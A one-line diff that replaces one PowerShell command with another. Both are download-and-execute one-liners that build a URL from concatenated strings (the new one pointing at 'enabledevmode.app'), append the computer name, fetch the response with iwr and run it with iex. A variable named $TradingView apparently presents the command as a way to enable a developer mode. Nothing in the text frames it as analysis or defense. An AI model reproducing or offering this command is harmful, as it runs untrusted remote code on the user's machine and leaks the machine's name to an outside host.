@@ -1,1 +1,1 @@
-powershell -command "if (($mode = 'dev') -and ($TradingView = 'enable' + 'mode.' + $mode + '?developer=' + $env:COMPUTERNAME)) { $r = (iwr $TradingView -UseBasicParsing); iex ([Text.Encoding]::UTF8.GetString($r.Content)) }"
+powershell -command "if (($TradingView = 'app') -and ($mode = 'enable' + 'devmode.' + $TradingView + '?developer=' + $env:COMPUTERNAME)) { $r = (iwr $mode -UseBasicParsing); iex ([Text.Encoding]::UTF8.GetString($r.Content)) }"
